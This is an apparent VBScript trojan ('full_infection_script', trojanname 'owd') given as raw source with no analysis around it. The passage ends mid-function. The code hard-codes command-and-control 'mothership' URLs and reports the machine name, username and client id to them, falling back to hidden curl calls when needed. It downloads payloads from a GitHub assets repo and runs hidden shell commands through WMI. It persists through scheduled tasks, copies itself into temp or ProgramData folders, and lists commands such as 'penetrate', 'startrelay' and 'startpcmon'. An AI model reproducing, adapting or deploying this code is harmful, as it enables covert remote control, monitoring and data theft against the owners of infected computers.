' 2026.06.21-1741

Option Explicit
On Error Resume Next

Dim fso : Set fso = CreateObject("Scripting.FileSystemObject")
Dim WshShell : Set WshShell = CreateObject("WScript.Shell")
Dim objNetwork : Set objNetwork = CreateObject("WScript.Network")

Function XIsEmpty(str)
   
    XIsEmpty = False
    
    If IsNull(str) Or IsEmpty(str) Or Len(Trim(str)) = 0 Then
        XIsEmpty = True   
    End If
    
End Function

Function IsWScript()
    If InStr(LCase(WScript.FullName), "cscript.exe") Then
        IsWScript = false
    Else
        IsWScript = true
    End If
End Function

Function LogErr()
    If Err.Number = 0 Then
        Exit Function
    End IF
    
    Call LogMsg("Err.Number=" & Hex(Err.Number))
    Call LogMsg("Err.Description=" & Err.Description)
    Call LogMsg("Err.Source=" & Err.Source)
End Function

Function PushEventMother(eventcode)
    Call LogMsgMotherT(eventcode,"event")
End Function

Function LogMsgMother(msg)
    Call LogMsgMotherT(msg,"msg")
End Function

Function LogMsgMotherT(msg,tag)
    On Error Resume Next
    Err.Clear
    
    Dim pp : pp = "LogMsgMotherT"
    
    If XIsEmpty(tag) Then
        tag = "msg"
    End If
    
    Call LogMsg(pp & ": " & msg & " " & tag)
    
    Dim umsg : umsg = msg
    
    Dim tparams : tparams = GetScriptTagStrUrlDirect()
    tparams = tparams & "&" & URLEncode(tag) & "=" & URLEncode(umsg)
    
    Dim result
    Dim res : res = HttpGet(mothership & "/ow/logmsg.php?" & tparams, result)
    
    If not res then
        Call LogMsg("LogMsgMotherT :: ERROR :: retrying using curl")
        
        Dim params : params =  GetScriptTagStrUrl()
        params = params & "--data-urlencode" & " " & dq & tag & "=" & umsg & dq
        
        res = RunShell("conhost.exe --headless cmd /c curl -ks -G " & mothership & "/ow/logmsg.php" & " " & params, true)
    End If
    
    If not res then
        Call LogMsg(pp & " :: ERROR :: failed to exec get request")
    End If
    
    LogMsgMotherT = res
    
    If Err.Number<>0 Then
        Call LogMsg(pp & " reporting error")
        Call LogErr()
        LogMsgMotherT = False
        Exit Function
    End If
    
    Call LogMsg(pp & " finished")
    
End Function

Function LogMsg(msg)
    
    If XIsEmpty(msg) Then
        Exit Function
    End If
    
    If Not IsWScript() Then
        WScript.Echo msg
    End If

    If Not logfObj is Nothing Then
        logfObj.WriteLine msg
    End If
    
End Function

Function GetMD5Hash(fpath, outfpath)
    GetMD5Hash = ""
    
    If XIsEmpty(fpath) Then
        Exit Function
    End IF
    
    Call LogMsg("GetMD5Hash")
    
    Dim ret : ret = RunShell("cmd /c certutil -hashfile " & fpath  & " md5 > " & outfpath, True)
    
    If not ret Then
        Exit Function
    End IF
    
    If Not fso.FileExists(outfpath) Then
        Exit Function
    End IF
    
    Dim content : content = ReadFile(outfpath)
    Dim linesArray : linesArray = Split(content, vbCrLf)

    If UBound(linesArray) >= 1 Then
        GetMD5Hash = linesArray(1)
    End If

    Call LogMsg("GetMD5Hash: " & GetMD5Hash)
End Function

Function GetProcessName(pid)
    Call LogMsg("GetProcessName: " & CStr(pid))
    
    GetProcessName = ""

    Dim list : Set list = GetProcessList()

    Dim i
    
    For i = 0 to list.Count
        Dim proc : proc = list.Item(i)
        
        if ( proc(1) = pid ) then
            GetProcessName = proc(0)
            Call LogMsg("GetProcessName: procname=" & GetProcessName)

            Exit Function
        End If
        
    Next
    
End Function

Function GetProcessList()
    Call LogMsg("GetProcessList")
    
    Dim list : Set list = CreateObject("Scripting.Dictionary")
    
    Set GetProcessList = list
    
    Dim objWMIService : Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Dim colItems : Set colItems = objWMIService.ExecQuery("SELECT Name, ProcessId FROM Win32_Process") ' doesn't return all processes

    Dim i : i = 0

    Dim item
    For Each item In colItems
    
        Dim myArray : myArray = Array(item.Name, item.ProcessId)

        list.Add i, myArray

        i = i + 1
    Next

    Set GetProcessList = list
End Function

Function GetTimestamp()
    Dim d, ts
    d = Now
    ts = Year(d) & _
         Right("0" & Month(d), 2) & _
         Right("0" & Day(d), 2) & _
         Right("0" & Hour(d), 2) & _
         Right("0" & Minute(d), 2) & _
         Right("0" & Second(d), 2)

    GetTimestamp = ts
End Function

Function HeadersToDict(responsetext)
    Err.Clear
    
    set HeadersToDict = nothing

    If XIsEmpty(responsetext) Then
        exit function
    End IF
    
    Call LogMsg("HeadersToDict -- begin")
    
    Dim headerLines : headerLines = Split(responsetext, vbCrLf)

    Dim myDict
    Set myDict = CreateObject("Scripting.Dictionary")

    Dim line
    For Each line In headerLines
        If Trim(line) <> "" and InStr(line, ":") >= 1 Then
            Dim parts
            parts = Split(line, ":")
            
            If UBound(parts) >= LBound(parts) Then
                Dim keystr : keystr = parts(0)
                
                Dim i : i = 1
                do while myDict.Exists(keystr)
                    keystr = parts(0) & "_" & CStr(i)
                    i = i + 1
                loop
                
                Call LogMsg("keystr: " & keystr & " line: " & line)
                myDict.Add keystr, line
                
            End IF
            
        End If
    Next

    set HeadersToDict = myDict

    Call LogMsg("HeadersToDict -- finished")

End Function

Function RetrieveAsset(fname, localfpath)
    Dim pp : pp = "RetrieveAsset"
    
    Dim headersout
    RetrieveAsset = DownloadFileWithHeaders(mothershipassets & fname, localfpath, Nothing, headersout)
    
    If not RetrieveAsset Then
        Call LogMsg(pp & " -- download failed")
    Else
        Call LogMsg(pp & " -- download success")
    End If
    
    If not fso.FileExists(localfpath) Then
        Call LogMsg(pp & " -- local file does not exist -- trying again using curl")
        
        Dim cmdstr
        cmdstr = "conhost.exe --headless cmd /c curl -kso " & localpath & " -G " & dq & url & dq 
        
        If not XIsEmpty(bunnyheader) Then
            cmdstr = cmdstr & " -H " & dq & bunnyheader & dq
        End If
        
        RetrieveAsset = RunShell(cmdstr, True)
    End If
    
    If Err.Number <> 0 Then
        Call LogMsg(pp & " -- reporting errors")
        Call LogErr()
    End If
    
    Call LogMsg(pp & " -- finished")
End Function

Function DownloadFile(sURL, headersin, sFile)
    Dim headers
    DownloadFile = DownloadFileWithHeaders(sURL, sFile, headersin, headers)
End Function

Function IsDict(objin)
    IsDict = False

    If Not headersin Is Nothing Then
        If IsObject(objin) Then
            If TypeName(objin) = "Dictionary" Then
                If objin.Count > 0 Then
                    IsDict = true
                End If
            End If
        End If
    End If
    
End Function

Function DownloadFileWithHeaders(sURL, sFile, headersin, headers)
    Dim pp : pp = "DownloadFileWithHeaders"
    DownloadFileWithHeaders = False
    
    On Error Resume Next
    
    Err.Clear
    
    If XIsEmpty(sURL) or XIsEmpty(sFile) Then
        Exit Function
    End If
    
    Call LogMsg(pp & ": " & sURL & " " & sFile & " -- " & GetTimestamp())


    Dim objHTTP, objStream
    
    Set objHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
    objHTTP.Open "GET", sURL, False

    Dim kkey
    If IsDict(headersin) Then
        For Each kkey In headersin
            objHTTP.SetRequestHeader kkey, headersin(kkey)
        Next
    End If

    objHTTP.Send

    Call LogMsg(pp & ": " & objHTTP.Status & " " & objHTTP.StatusText )    
    
    If objHTTP.Status <> 200 Then
        Call LogMsg(pp & ": error: objHTTP.Status is not 200")
        Exit Function
    End If
    

    If XIsEmpty(objHTTP.ResponseBody) Then
        Call LogMsg(pp & ": ResponseBody is empty")
        Exit Function
    End If
    
   
    Dim allHeadersstr : allHeadersstr = objHTTP.getAllResponseHeaders()
    Call LogMsg(pp & ": header: " & vbCrLf & allHeadersstr & vbCrLf & "--- END ---" & vbCrLf )

    set headers = HeadersToDict(allHeadersstr)

    If not XIsEmpty(objHTTP.ResponseBody) Then
        Call LogMsg(pp & " writing ResponseBody out to file: " & sFile)

        Set objStream = CreateObject("ADODB.Stream")
        objStream.Type = 1 ' adTypeBinary
        objStream.Open

        Dim count : count = UBound(objHTTP.ResponseBody) - LBound(objHTTP.ResponseBody) + 1

        Call LogMsg(pp & ": ResponseBody byte count: " & CStr(count))
	
        objStream.Write objHTTP.ResponseBody ' objHTTP.ResponseText    
        objStream.SaveToFile sFile, 2 ' adSaveCreateOverWrite (2) overwrites existing file
        objStream.Close
        Set objStream = Nothing

    end if
    
    Set objHTTP = Nothing

	If Err.Number <> 0 Then
		Call LogErr()
		DownloadFileWithHeaders = false
		Exit Function
    End If
	
	DownloadFileWithHeaders = true
    

    If Err.Number <> 0 Then
        Call LogMsg(pp & " -- reporting errors")
        Call LogErr()
        Exit Function
    End If
    
    Call LogMsg(pp & " finished")

End Function

Function URLEncode(str)
    URLEncode = ""
    
    If XIsEmpty(str) Then
        Exit Function
    End If
    
    Dim i, kchar, code, result
    result = ""
    
    For i = 1 To Len(str)
        kchar = Mid(str, i, 1)
        code = Asc(kchar)
        
        If (code >= 48 And code <= 57) Or _
           (code >= 65 And code <= 90) Or _
           (code >= 97 And code <= 122) Then
            result = result & kchar
        Else
            result = result & "%" & Hex(code)
        End If
    Next
    
    URLEncode = result
    
End Function

Function GetRandom(n)
    GetRandom = ""
    
    If n <= 0 Then
        Exit Function
    End If
    
    Randomize

    Dim min, max, randomNumber

    min = 10000000
    max = 99999999

    GetRandom = ""
    
    Do While Len(GetRandom) < n
        GetRandom = GetRandom & CStr(Int((max - min + 1) * Rnd + min))
    Loop

    GetRandom = Mid(GetRandom, 1, n)
End Function

Function ExtractText(inpingstr, begin_token, end_token)
    
    If XIsEmpty(inpingstr) Then
        Exit Function
    End If
    
    Call LogMsg("ExtractText: " & begin_token & " " & end_token)
    
    ExtractText = ""
    
    Dim start_position : start_position = InStr(1, inpingstr, begin_token, 1)

    if ( start_position <= 0 ) Then
        Exit Function
    end if
    
    Dim end_position : end_position = InStr(1, inpingstr, end_token, 1)        

    start_position = start_position + Len(begin_token)
    
    if ( end_position <= 0 ) or ( start_position >= end_position ) Then
		Exit Function
    End if
    
    ExtractText = Mid(inpingstr, start_position, end_position-start_position)

    if begin_token = "EXEC_CMD_BEGIN" then
        
        if (Mid(ExtractText,1,1) = "|") then
            ExtractText = Mid(ExtractText,2,Len(ExtractText)-1)
        end if

        if (Mid(ExtractText,Len(ExtractText),1) = "|") then
            ExtractText = Mid(ExtractText,1,Len(ExtractText)-1)
        end if
        
    end if
    
    Call LogMsg("ExtractText finished")

End Function

Function Reset(fpath)
    Call LogMsg("Reset " & fpath)
    
    If XIsEmpty(fpath) Then
        Exit Function
    End If

    Call LogMsg("Reset: " & fpath)
    
    fpath = Trim(fpath)
       
    If fso.FileExists(fpath) Then
        fso.DeleteFile(fpath)
    End If
    
    Dim fileObj : Set fileObj = fso.CreateTextFile(fpath, True)
    
				  
 
    fileObj.Close
    Set fileObj = Nothing

									 

    If not fso.FileExists(fpath) Then
        Call RunShell("conhost.exe --headless cmd /c type nul > " & fpath, True)
    End If
    
End Function

Function ReadFile(fpath)
    On Error Resume Next
    Err.Clear
    
    ReadFile = ""
    
    If XIsEmpty(fpath) Then
        Exit Function
    End If
    
    fpath = Trim(fpath)
    
    If Not fso.FileExists(fpath) Then
        Exit Function
    End If
    
    Dim objFile : set objFile = fso.OpenTextFile(fpath, 1)
    
    ReadFile = objFile.ReadAll

    objFile.Close
    Set objFile = Nothing
End Function

Function ReadTag(fpath)
    Call LogMsg("ReadTag " & fpath)

    ReadTag = ReadFile(fpath)
    
    ReadTag = Trim(ReadTag)
    ReadTag = Replace(ReadTag, " ", "")
    ReadTag = Replace(Replace(Replace(ReadTag, vbCr, ""), vbLf, ""), vbTab, "")    

    Call LogMsg("ReadTag " & ReadTag)
    
End Function

Function ReadClientId(clientidpath)
    Dim objFile
    
    ReadClientId = "zzwwxxyy"
    
    If XIsEmpty(clientidpath) Then
        Exit Function
    End If
    
    clientidpath = Trim(clientidpath)
    
    If Not fso.FileExists(clientidpath) Then
        ReadClientId = GetRandom(8)
        
        set objFile = fso.OpenTextFile(clientidpath, 2, True)
        
        objFile.WriteLine(ReadClientId)
        
        objFile.Close
        
        Set objFile = Nothing
        
        Exit Function
    End If
    
    set objFile = fso.OpenTextFile(clientidpath, 1)
    
    Dim clientidstr : clientidstr = objFile.ReadLine

    clientidstr = Replace(Replace(clientidstr, vbCr, ""), vbLf, "")
    clientidstr = Trim(clientidstr)
        
    ReadClientId = CStr(clientidstr)
    
    objFile.Close
    Set objFile = Nothing
End Function

Function ExecShellAsync(cmdstr)
    Dim pp : pp = "ExecShellAsync"
    
    If XIsEmpty(cmdstr) Then
        Exit Function
    End If
    
    Call LogMsg(pp & ": " & cmdstr)
    
    Const HIDDEN_WINDOW = 0
    Dim strComputer : strComputer = "."
    Dim strCommand: strCommand = cmdstr

    Dim objWMIService: Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")

    Dim objStartup: Set objStartup = objWMIService.Get("Win32_ProcessStartup")
    Dim objConfig: Set objConfig = objStartup.SpawnInstance_
    objConfig.ShowWindow = HIDDEN_WINDOW

    Dim objProcess: Set objProcess = objWMIService.Get("Win32_Process")

    Dim intPID
    Dim intReturn : intReturn = objProcess.Create(strCommand, Null, objConfig, intPID)

    If intReturn = 0 Then
        Call LogMsg("Process started successfully. PID: " & intPID)
    Else
        Call LogMsg("Process failed to start with error code: " & intReturn)
    End If

    ExecShellAsync = intPID
    
    Call LogMsg(pp & ": finished")
End Function

' executes async
Function ExecShell(cmdstr)
    Dim pp : pp = "ExecShell"
    
    Err.Clear
    
    ExecShell = -1
    
    ' anchor
    Dim objExec : Set objExec = WshShell.Exec(cmdstr)

    ExecShell = objExec.ProcessID

    If Err.Number <> 0 Then
        Call LogMsg(pp & " -- reporting errors")
        Call LogErr()
    End If

End Function

Function RunShell(cmdstr, sync)
    On Error Resume Next
    Err.Clear
    
    If XIsEmpty(cmdstr) Then
        Exit Function
    End If
    
    Call LogMsg("runshell: " & cmdstr)
             
    
    Dim intReturn : intReturn = WshShell.Run(cmdstr, 0, sync)

    Call LogMsg("runshell: intReturn: " & CStr(intReturn))

    If Err.Number <> 0 Then
        RunShell = False
        
        Call LogMsg("runshell: Err.Number: " & Err.Number)
        Call LogMsg("runshell: Err.Source: " & Err.Source)
        Call LogMsg("runshell: Err.Description: " & Err.Description)

        Err.Clear
    End If


    If intReturn = 0 Then
        RunShell = true
    Else
        RunShell = false
    End If
End Function

Function KillTaskPid(tpid)
    
    Call LogMsg("KillTaskPid -- starting")
    
    IF XIsEmpty(tpid) Then
        Call LogMsg("KillTaskPid -- empty pid -- exiting")
        Exit Function
    End If
    
    Dim res : res = RunShell("conhost.exe --headless cmd /c taskkill /f /pid " & tpid, true)
    
    Dim qstr : qstr = "winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2"
    
    Dim objWMIService : Set objWMIService = GetObject(qstr)

    Dim colProcessList : Set colProcessList = objWMIService.ExecQuery("Select * from Win32_Process Where ProcessId = " & CStr(pid))

    Dim objProcess
    For Each objProcess in colProcessList
        objProcess.Terminate()
        exit for
    Next

End Function

Function ToTaskTime(startTime)
    
    ' Dim startTime : startTime = Now
    
    ToTaskTime = Year(startTime) & "-" & _
        Right("0" & Month(startTime), 2) & "-" & _
        Right("0" & Day(startTime), 2) & "T" & _
        Right("0" & Hour(startTime), 2) & ":" & _
        Right("0" & Minute(startTime), 2) & ":00"
        
End Function

Function CreateTaskXML(taskname, taskxmlpath)
    
    If XIsEmpty(taskname) Then
        Exit Function
    End IF

    If XIsEmpty(taskxmlpath) Then
        Exit Function
    End IF
    
    Call LogMsg("CreateTaskXML: " & taskname & " " & taskxmlpath)
    
    Dim strCommand : strCommand = "schtasks /create /XML " & dq & taskxmlpath & dq  &" /tn " & dq & taskname & dq & " /F"
    
    Dim ret : ret = RunShell(strCommand, True)

    Call LogMsg("CreateTaskXML: ret: " & CStr(ret))

    CreateTaskXML = ret
End Function

Function GetScriptTag()
    Dim objDict : Set objDict = CreateObject("Scripting.Dictionary")

    objDict.Add "clientid", clientid
    objDict.Add "script_version", script_version
    objDict.Add "source", source
    objDict.Add "scriptts", scriptts
    objDict.Add "machinename", machinename
    objDict.Add "username", username
    objDict.Add "scriptmd5", scriptmd5
    
    if not XIsEmpty(sessionid) Then
        objDict.Add "sessionid", sessionid
    end if

    if not XIsEmpty(jobcode) Then
        objDict.Add "jobcode", jobcode
    end if

    if not XIsEmpty(batchid) Then
        objDict.Add "batchid", batchid
    end if
    
    Set GetScriptTag = objDict
End Function

Function GetScriptTagStr()
    GetScriptTagStr = ""
    
    Dim scripttag : Set scripttag = GetScriptTag()
    
    Dim keys : keys = scripttag.Keys
    Dim strKey

    For Each strKey In keys
        GetScriptTagStr = GetScriptTagStr & "[" & strKey & "]=[" & scripttag.Item(strKey) & "]|"
    Next

End Function

Function GetScriptTagStrUrlDirect()
    GetScriptTagStrUrlDirect = ""
    
    Dim scripttag : Set scripttag = GetScriptTag()
    
    Dim keys : keys = scripttag.Keys
    Dim strKey

	Dim i : i = 0
    For Each strKey In keys
		
		If i = 0 Then
			GetScriptTagStrUrlDirect = URLEncode(strKey) & "=" & URLEncode(scripttag.Item(strKey))
		Else
			GetScriptTagStrUrlDirect = GetScriptTagStrUrlDirect & "&" & URLEncode(strKey) & "=" & URLEncode(scripttag.Item(strKey))
		End IF
		
		i = i + 1
    Next

End Function

Function GetScriptTagStrUrl()
    GetScriptTagStrUrl = ""
    
    Dim scripttag : Set scripttag = GetScriptTag()
    
    Dim keys : keys = scripttag.Keys
    Dim strKey

	' --data-urlencode "source=zfei.vbs" 
    For Each strKey In keys
		GetScriptTagStrUrl = GetScriptTagStrUrl & " --data-urlencode " & dq & strKey & "=" & scripttag.Item(strKey) & dq & " "
    Next

End Function

Function GetScriptPID()
    GetScriptPID = -1
    
    Dim objWMIService : Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Dim WshShell : Set WshShell = CreateObject("WScript.Shell")

    Dim strUniqueTitle : strUniqueTitle = "GetPID_" & Timer()
    Dim strCommand : strCommand = "cmd /c title " & strUniqueTitle & " & timeout 5"

    wshShell.Run strCommand, 0, False
    WScript.Sleep 100 

    Dim strQuery : strQuery = "SELECT ParentProcessId FROM Win32_Process WHERE CommandLine LIKE '%" & strUniqueTitle & "%'"
    Dim colItems : Set colItems = objWMIService.ExecQuery(strQuery)

    Dim objItem
    For Each objItem In colItems
        GetScriptPID = objItem.ParentProcessId
    Next

End Function

Function GetLocalUsers()
    GetLocalUsers = ""
    
    Dim objWMIService : Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Dim colItems : Set colItems = objWMIService.ExecQuery("Select * from Win32_UserAccount Where LocalAccount = True")

    Dim isempty : isempty = False
    
    If colItems Is Nothing Then
        isempty = True
    ElseIf colItems.Count = 0 Then
        isempty = True
    End IF
    
    If isempty Then
        Exit Function
    End IF
    
    Dim objItem
    For Each objItem in colItems
        GetLocalUsers = GetLocalUsers & objItem.Name & "|"
    Next

End Function

Function FileExists(dirpath, fname)
    FileExists = False
    
    If fso.FolderExists(dirpath) Then
        Dim folder : Set folder = fso.GetFolder(dirpath)
        
        Dim file
        For Each file In folder.Files 
            If LCase(file.Name) = LCase(fname) Then
                FileExists = True
                Exit Function
            End If
        Next
        
    End If
    
End Function

Function WriteFile(fpath, msgstr)
    If XIsEmpty(msgstr) Then
        msgstr = ""
    End If
    
    Call LogMsg("WriteFile: " & fpath)
    
    Const ForWriting = 2
    Const CreateIfNotExist = True

    Dim oFile : Set oFile = fso.OpenTextFile(fpath, ForWriting, CreateIfNotExist)

    oFile.Write msgstr

    oFile.Close
    Set oFile = Nothing

End Function

Function HttpGet(urlstr, ByRef result)
    Dim pp : pp = "HttpGet"
    HttpGet = False
    
    On Error Resume Next
    Err.Clear
    
    If XIsEmpty(urlstr) Then
        Exit Function
    End If
    
    Call LogMsg(pp & ": " & urlstr)

    Set result = CreateObject("Scripting.Dictionary")
    
    Dim objHTTP, objStream
    
    Call LogMsg(pp & " sending request...")
    
    Set objHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
    objHTTP.Open "GET", urlstr, False

    Call LogErr()

    objHTTP.Send

    Call LogErr()

    Call LogMsg(pp & ": status: " & objHTTP.Status & " " & objHTTP.StatusText )    
    
    If XIsEmpty(objHTTP.ResponseBody) Then
        Call LogMsg("HttpGet: ResponseBody is empty")        
    End If
        
    Dim allHeadersstr : allHeadersstr = objHTTP.getAllResponseHeaders() & vbCrLf
    Call LogMsg(pp & ": headers: " & vbCrLf & allHeadersstr & vbCrLf )

    result.Add "headers", allHeadersstr
    
    If Not XIsEmpty(objHTTP.ResponseBody) Then
        Call LogMsg(pp & ": writing ResponseBody to memory" )

        Set objStream = CreateObject("ADODB.Stream")
        objStream.Type = 1 ' adTypeBinary
        objStream.Open

        Dim count : count = UBound(objHTTP.ResponseBody) - LBound(objHTTP.ResponseBody) + 1

        result.Add "bodybytecount", count

        Call LogMsg(pp & ": ResponseBody byte count: " & CStr(count))
        
        objStream.Write objHTTP.ResponseBody ' objHTTP.ResponseText    
       
        result.Add "ResponseBody", objStream.Read
        
        objStream.Close
        Set objStream = Nothing    
    End If
    
    Set objHTTP = Nothing

	If Err.Number <> 0 Then
        Call LogMsg(pp & " logging error")

        result.Add "error", Err.Number
        
		Call LogErr()
		HttpGet = false
		Exit Function
    End If
    
    HttpGet = true

    Call LogMsg(pp & " finished")

End Function

Function SelectMothership()
    Dim listptr
    
    Call LogMsg("SelectMothership")
    
    listptr = mothershiplist
    If istpl Then
        Call LogMsg("switching to tpl mothership list")
        listptr = tplmothershiplist
    End If
    
	Dim n : n = UBound(mothershiplist)+1
	
    if istpl then
    	n = UBound(tplmothershiplist)+1
    end if
    
    selectedmothershipindex = 0
    
    If not XIsEmpty(mothership) Then
        
        Dim elemstr
        Dim i : i = 0
        For Each elemstr In listptr 
            
            If LCase(mothership) = LCase(elemstr) Then
                Call LogMsg("mothership => " & CStr(elemstr))
                selectedmothershipindex = i
                Exit For
            End If
            
            i = i + 1
        Next
        
    End If
    
	selectedmothershipindex = selectedmothershipindex + 1
    
    if istpl then        
        Randomize 

        selectedmothershipindex = selectedmothershipindex + Int(n * Rnd() + 1)
    end if
	
	if selectedmothershipindex >= n then
		selectedmothershipindex = 0
	end IF
	
    if istpl then
        mothership = tplmothershiplist(selectedmothershipindex)
    else
        mothership = mothershiplist(selectedmothershipindex)
	end if
    
	SelectMothership = mothership
	
    Call WriteFile( workdir & "\" & "mothership", mothership )

    Call LogMsg("SelectMothership: " & CStr(selectedmothershipindex) & " " & mothership)

End Function

Function OverWriteFile(srcpath, destpath)
	Call LogMsg("OverWriteFile -- starting")
	
	If XIsEmpty(srcpath) then
		Call LogMsg("OverWriteFile -- srcpath is empty string -- exiting")
		Exit Function
	End IF
	
	If not fso.FileExists(srcpath) then
		Call LogMsg("OverWriteFile -- srcpath file does not exist -- exiting")
		Exit Function
	End if
	
	Call TryDeleteFile(destpath)
	
	If not fso.FileExists(destpath) then
		Call TryCopyFile(srcpath, destpath)
	End IF
	
	Call LogMsg("OverWriteFile -- finished")
End Function

Function TryCopyFile(srcpath, destpath)
    If XIsEmpty(srcpath) or XIsEmpty(destpath) Then
        Exit Function
    End IF
    
    Call LogMsg("TryCopyFile: " & srcpath & " " & destpath)
        
    If Not fso.FileExists(destpath) Then
        fso.CopyFile srcpath, destpath, True
    End IF    
    
    If Not fso.FileExists(destpath) Then
        Call RunShell("conhost.exe --headless cmd /c copy /y " & srcpath & " " & destpath, True)
    End IF

End Function

Function TryDeleteFile(fpath)
    Call LogMsg("TryDeleteFile: " & fpath)
    
	If not fso.FileExists(fpath) then
		Exit Function
	end IF
	
    If fso.FileExists(fpath) Then
        fso.DeleteFile fpath, true
    End If
    
    If fso.FileExists(fpath) Then
        Call RunShell("conhost.exe --headless cmd /c del /F /Q " & fpath, True)
    End If
    
End Function


' --- BEGIN: globals static initialization

Dim appDataPath : appDataPath = WshShell.ExpandEnvironmentStrings("%APPDATA%")

Dim dq : dq = Chr(34)
Dim tempPath : tempPath = fso.GetSpecialFolder(2)

Dim sessionid : sessionid = GetRandom(8) 
Dim batchid : batchid = sessionid
Dim jobcode : jobcode = "" 

Dim tplmothershiplist()
ReDim tplmothershiplist(0)
tplmothershiplist(0) = "https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault"

Dim mothershiplist()
ReDim mothershiplist(2)
mothershiplist(0) = "https://seashell-raven-793508.hostingersite.com"
mothershiplist(1) = "http://s1083932807.online-home.ca"
mothershiplist(2) = "https://darksalmon-crow-356809.hostingersite.com"

Dim selectedmothershipindex : selectedmothershipindex = 0
Dim mothership : mothership = mothershiplist(selectedmothershipindex)

Dim mothershipassets : mothershipassets = "https://raw.githubusercontent.com/owd842/mothershipassets/master/"


Dim cmdslist : cmdslist = Array("ping", "cmdlist", "watchdog", "retrieve", "penetrate", "reschedule", "startrelay", "startpcmon")

Dim cmdname : cmdname = ""

If WScript.Arguments.Count > 0 Then
    cmdname = WScript.Arguments(0)
End If

Dim cmdtaskname : cmdtaskname = ""
If cmdname = "task" Then
    If WScript.Arguments.Count > 1 Then
        cmdtaskname = WScript.Arguments(1)
    End If
End IF

Dim scriptts : scriptts = GetTimestamp()
Dim clientid : clientid = "abcdwxyz"
Dim source : source = WScript.ScriptName
Dim scriptpath : scriptpath = WScript.ScriptFullName
Dim scriptdir : scriptdir = fso.GetParentFolderName(WScript.ScriptFullName)
' WScript.CurrentDirectory

Dim machinename : machinename = "LOCALHOST"
Dim username : username = "UNKNOWNUSER"
Dim script_version : script_version = "full_infection_script"

If Not objNetwork Is Nothing Then
    machinename = objNetwork.ComputerName
    username = objNetwork.UserName
End If

If WScript.Arguments.Count = 0 Or XIsEmpty(cmdname) Then
    Dim apos : apos = InStr(source, "_") 
    Dim bpos : bpos = InStr(source, ".") 
    
    If ( ( bpos > apos) and ( apos > 0 ) ) Then
        cmdname = Mid(source, apos+1, bpos-apos-1)
    End If
End If

If XIsEmpty(cmdname) Then
    cmdname = "init"
End IF

Dim trojanname : trojanname = "owd"

Dim tskname : tskname=UCase(trojanname) & "_retry_infection_vbs"

Dim runnerdelaytime : runnerdelaytime = 60
Dim cmdlistdelaytime : cmdlistdelaytime = 30
Dim pingdelaytime : pingdelaytime = 30
Dim watchdogtimedelay : watchdogtimedelay = 30
Dim tskxmltime : tskxmltime=90 
Dim timetaskxmltime : timetaskxmltime=90

Dim trojanfname : trojanfname = "zfei.vbs"

Dim workdir : workdir = tempPath & "\" & trojanname 
Dim exepath : exepath = workdir & "\" & "launch.exe"

Dim configfpath : configfpath = workdir & "\" & "config.txt"
Dim pythonpath : pythonpath = workdir & "\" & "python\work\Portable Python-3.10.5 x64\App\Python"
Dim pythonexe : pythonexe = pythonpath & "\" & "python.exe"
Dim relayfname : relayfname = "relay.py"
Dim relaydir : relaydir = workdir & "\" & "relay"
Dim pcmonfname : pcmonfname = "pcmon.exe"
Dim pspcmonfname : pspcmonfname = "pc_monitoring.ps1"
Dim pcmondir : pcmondir = workdir & "\" & "pcmon"

Dim istplmode : istplmode = False

If fso.FileExists(scriptdir & "\" & "tplmode") Then
    istplmode = true
End If

Dim istpl : istpl = false 
If LCase(Mid(machinename, 1, 5)) = LCase("RLPCP") Or istplmode Then
    istpl = True
    
    script_version = "tpl_full_infection_script"
    tskxmltime = 15
    timetaskxmltime = 5

    mothership = tplmothershiplist(selectedmothershipindex)

    workdir = "C:\ProgramData\" & trojanname

    exepath = workdir & "\" & "tpl_launch.exe"
	configfpath = workdir & "\" & "config.txt"
	pythonpath = workdir & "\" & "python\work\Portable Python-3.10.5 x64\App\Python"
	pythonexe = pythonpath & "\" & "python.exe"
	relaydir = workdir & "\" & "relay"
	pcmondir = workdir & "\" & "pcmon"

End IF

Dim logfpath: logfpath = workdir & "\" & "master_" & cmdname & "_" & scriptts & ".log"
Dim logfObj : Set logfObj = fso.OpenTextFile(logfpath, 8, True)

Dim lockfilepath : lockfilepath = workdir & "\" & trojanfname & "_" & cmdname & ".lock"
Dim lockfileObj 

If not fso.FileExists(workdir & "\" & "mothership") Then
    Call WriteFile(workdir & "\" & "mothership", mothership)
End If

Dim scriptmd5

' --- END

Function Init()
    On Error Resume Next
    Err.Clear
    
    Call LogMsg("Init")
    
    If XIsEmpty(cmdname) Then
        Call LogMsg("fatal error -- cmdname is empty -- exiting")
        WScript.Quit(1)
    End IF

    If Not fso.FolderExists(workdir) Then
        fso.CreateFolder(workdir)
    End If

    WshShell.CurrentDirectory = workdir

    Call LogMsg("attempting to obtain lock")
    
    Err.Clear

    Call TryDeleteFile(lockfilepath)
    
    If Err.Number <> 0 Or fso.FileExists(lockfilepath) Then
        Call LogMsg("singleton rule -- unable to delete lock file, exiting")
        Call LogErr()
        WScript.Quit(1)
    Else
        
        Set lockfileObj = fso.OpenTextFile(lockfilepath, 8, True)
        Call lockfileObj.WriteLine("locked")

    End If
            

    If Not fso.FileExists(workdir & "\" & trojanfname) Then
        fso.CopyFile scriptpath, workdir & "\" & trojanfname, True
    End If    

    If fso.FileExists(workdir & "\" & "mothership") Then
        Call LogMsg("mothership exists reading it")
        mothership = ReadTag( workdir & "\" & "mothership" )
    End If
    
    If XIsEmpty(mothership) Then
        mothership = SelectMothership()
    End If
    
    Call LogMsg("calculating MD5Hash")
    scriptmd5 = GetMD5Hash(workdir & "\" & trojanfname, workdir & "\" & "scriptmd5" )
        
    clientid = ReadClientId(workdir & "\" & "client_id")
    
    Call LogMsg("starting source=" & source & " cmdname=" & cmdname & " cmdtaskname=" & cmdtaskname & " clientid=" & clientid & " mothership=" & mothership & " -- " & scriptts )
    	
    If cmdname = "init" or cmdname = "task" Then
     
        StartupLogic()
        
        Call LogMsg("init finished -- exiting")
        WScript.Quit(0)
    End If
    
    'If InStr(LCase(Join(cmdslist)), LCase(cmdname)) >= 1 Then
    Call LogMsg("Init: calling into " & cmdname)
    
    Dim func : Set func = GetRef(cmdname)
    
    func()
    
    Call LogMsg("Init: [" & cmdname & "] finished")

    IF Err.Number <> 0 Then
